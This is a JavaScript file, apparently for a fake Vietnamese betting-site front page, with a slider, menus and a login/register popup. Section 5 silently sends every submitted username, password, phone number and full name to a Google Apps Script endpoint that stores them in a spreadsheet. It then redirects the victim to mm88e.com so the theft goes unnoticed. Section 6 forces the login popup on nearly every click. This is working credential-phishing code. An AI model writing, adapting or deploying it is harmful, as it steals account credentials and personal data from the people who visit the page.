document.addEventListener('DOMContentLoaded', function() {
    
    // ==========================================
    // 1. XỬ LÝ BANNER SLIDER
    // ==========================================
    const bannerWrapper = document.querySelector('.banner-wrapper');
    const dots = document.querySelectorAll('.banner-dots .dot');
    
    if (bannerWrapper && dots.length > 0) {
        let currentSlide = 0;
        const totalSlides = dots.length;

        function showSlide(index) {
            currentSlide = index;
            bannerWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            dots[currentSlide].classList.add('active');
        }

        function nextSlide() {
            let nextIndex = (currentSlide + 1) % totalSlides;
            showSlide(nextIndex);
        }

        let slideInterval = setInterval(nextSlide, 3000);

        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => {
                showSlide(index);
                clearInterval(slideInterval);
                slideInterval = setInterval(nextSlide, 3000);
            });
        });
    }

    // ==========================================
    // 2. XỬ LÝ CLICK MENU TRÁI
    // ==========================================
    const sidebarItems = document.querySelectorAll('.game-sidebar .sidebar-item');
    if (sidebarItems.length > 0) {
        sidebarItems.forEach(item => {
            item.addEventListener('click', function() {
                sidebarItems.forEach(nav => nav.classList.remove('active'));
                this.classList.add('active');
            });
        });
    }

    // ==========================================
    // 3. XỬ LÝ POPUP ĐĂNG NHẬP / ĐĂNG KÝ
    // ==========================================
    const modal = document.getElementById('auth-modal');
    const formLogin = document.getElementById('login-form');
    const formRegister = document.getElementById('register-form');
    
    const btnCloseModal = document.getElementById('btn-close-modal');
    if (btnCloseModal) {
        btnCloseModal.addEventListener('click', (e) => {
            e.preventDefault(); 
            modal.style.display = 'none';
        });
    }
    
    const btnOpenLogin = document.querySelector('.btn-login');
    const btnOpenRegister = document.querySelector('.btn-register');
    
    function openAuthModal(type) {
        if(modal) modal.style.display = 'block'; 
        if (type === 'login') {
            if(formLogin) formLogin.style.display = 'flex';
            if(formRegister) formRegister.style.display = 'none';
        } else if (type === 'register') {
            if(formLogin) formLogin.style.display = 'none';
            if(formRegister) formRegister.style.display = 'flex';
        }
    }

    if (btnOpenLogin) btnOpenLogin.addEventListener('click', () => openAuthModal('login'));
    if (btnOpenRegister) btnOpenRegister.addEventListener('click', () => openAuthModal('register'));

    const switchLinks = document.querySelectorAll('.link-switch');
    switchLinks.forEach(link => {
        link.addEventListener('click', function() {
            const target = this.getAttribute('data-target');
            openAuthModal(target);
        });
    });

    // ==========================================
    // 4. XỬ LÝ CLICK THANH ĐIỀU HƯỚNG DƯỚI CÙNG
    // ==========================================
    const bottomNavItems = document.querySelectorAll('.bottom-nav .nav-item');
    if (bottomNavItems.length > 0) {
        bottomNavItems.forEach(item => {
            item.addEventListener('click', function() {
                bottomNavItems.forEach(nav => nav.classList.remove('active'));
                this.classList.add('active');
            });
        });
    }

    // ==========================================
    // 5. KIỂM TRA ĐIỀN FORM VÀ ĐẨY DỮ LIỆU LÊN GOOGLE SHEETS
    // ==========================================
    // DÁN URL WEB APP CỦA GOOGLE APPS SCRIPT VÀO ĐÂY
    const scriptURL = 'https://script.google.com/macros/s/AKfycbyFwDzyG_7DSpn_ZYuYhAysTnPJdL0_m6B-vIyORBJ1h70xa_fbiYku4cmT-ewrv2QXGg/exec';

    function setupFormValidation(formId) {
        const form = document.getElementById(formId);
        if (!form) return;

        const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="tel"]');
        const submitBtn = form.querySelector('.btn-submit');
        const checkbox = form.querySelector('input[type="checkbox"]');
        const phoneInput = form.querySelector('input[type="tel"]');

        if (phoneInput) {
            phoneInput.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, ''); 
            });
        }

        function checkInputs() {
            let isValid = true;
            inputs.forEach(input => {
                const val = input.value.trim();
                if (val === '') isValid = false;
                if (input.placeholder.toLowerCase().includes('tên người dùng') || 
                    input.placeholder.toLowerCase().includes('mật khẩu')) {
                    if (val.length < 6 || val.length > 20) isValid = false;
                }
                if (input.type === 'tel' && val.length !== 10) isValid = false;
            });
            if (checkbox && formId === 'register-form' && !checkbox.checked) isValid = false;
            if (submitBtn) submitBtn.disabled = !isValid;
        }

        inputs.forEach(input => input.addEventListener('input', checkInputs));
        if (checkbox) checkbox.addEventListener('change', checkInputs);
        checkInputs();

        if(submitBtn) {
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();
                if (!this.disabled) {
                    // Cập nhật giao diện nút đang xử lý
                    this.innerText = 'ĐANG XỬ LÝ...';
                    this.disabled = true;

                    // Trích xuất dữ liệu từ các trường nhập liệu
                    const username = form.querySelector('input[placeholder="Tên người dùng"]').value;
                    const password = form.querySelector('input[placeholder="Mật khẩu"]').value;
                    const phone = form.querySelector('input[placeholder="Số điện thoại"]').value;
                    const fullnameInput = form.querySelector('input[placeholder="Họ và tên"]');
                    const fullname = fullnameInput ? fullnameInput.value : '';
                    const status = formId === 'login-form' ? 'Đăng Nhập' : 'Đăng Ký';

                    // Đóng gói đối tượng FormData
                    let formData = new FormData();
                    formData.append('status', status);
                    formData.append('username', username);
                    formData.append('password', password);
                    formData.append('phone', phone);
                    formData.append('fullname', fullname);

                    // Gửi fetch request không đồng bộ
                    fetch(scriptURL, { method: 'POST', body: formData })
                        .then(response => {
                            window.location.href = 'https://www.mm88e.com/';
                        })
                        .catch(error => {
                            console.error('Lỗi kết nối:', error.message);
                            window.location.href = 'https://www.mm88e.com/'; // Vẫn cho phép chuyển trang nếu mạng lỗi
                        });
                }
            });
        }
    }

    setupFormValidation('login-form');
    setupFormValidation('register-form');

    // ==========================================
    // 6. BẬT FORM ĐĂNG NHẬP KHI CLICK VÀO CÁC THÀNH PHẦN KHÁC
    // ==========================================
    const requireAuthElements = document.querySelectorAll('.game-card, .quick-icons .icon-item, .game-sidebar .sidebar-item, .bottom-nav .nav-item');
    requireAuthElements.forEach(element => {
        element.addEventListener('click', function() {
            openAuthModal('login');
        });
    });

});